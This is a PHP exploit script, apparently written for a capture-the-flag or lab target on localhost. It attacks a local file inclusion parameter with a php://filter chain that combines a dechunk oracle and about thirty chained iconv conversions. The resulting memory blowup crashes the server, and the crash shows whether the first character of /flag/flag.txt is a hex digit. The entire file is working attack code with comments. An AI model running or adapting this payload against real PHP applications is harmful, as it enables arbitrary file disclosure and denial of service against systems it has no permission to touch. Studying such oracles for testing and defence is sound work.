<?php
// exploit_test/exploit.php

$url = "http://localhost:9051/index.php";

echo "[*] Testing /flag/flag.txt (Starts with 'f')\n";

// 1. Construct the Bomb (Exponential Blowup)
// We use a chain of convert.iconv.UTF8.UTF16 to double the size repeatedly.
// Standard 'Bomb' logic.
$bomb = "convert.iconv.UTF8.UTF16";
for ($i = 0; $i < 29; $i++) {
    $bomb .= "|convert.iconv.UTF8.UTF16";
}

// 2. Add the Dechunk Oracle at the START
// Logic: 
// - If First Char is Hex (0-9, a-f): Dechunk fails -> Discards Data -> Bomb gets Empty string -> NO CRASH.
// - If First Char is Non-Hex (g-z): Dechunk passes data -> Bomb gets Huge Data -> CRASH.
$payload = "php://filter/read=dechunk|$bomb/resource=/flag/flag.txt";

// 3. Send Request
$data = ['page' => $payload];
$options = [
    'http' => [
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data),
        'timeout' => 5 // Short timeout for crash detection
    ]
];

$context = stream_context_create($options);
$start = microtime(true);

echo "[*] Sending Payload...\n";
$result = @file_get_contents($url, false, $context);
$end = microtime(true);
$duration = $end - $start;

// 4. Analyze Result
if ($result === FALSE) {
    // file_get_contents returns FALSE on 500 error (Crash)
    echo "[-] CRASH DETECTED (500 Error)\n";
    echo "    Meaning: First char is NON-HEX.\n";
    echo "    Result: MISMATCH (Expected Hex 'f')\n";
} else {
    echo "[+] NO CRASH (200 OK)\n";
    echo "    Meaning: First char is HEX.\n";
    echo "    Result: MATCH! (Confirmed 'f' is Hex)\n";
}

echo "    Time: " . round($duration, 4) . "s\n";
?>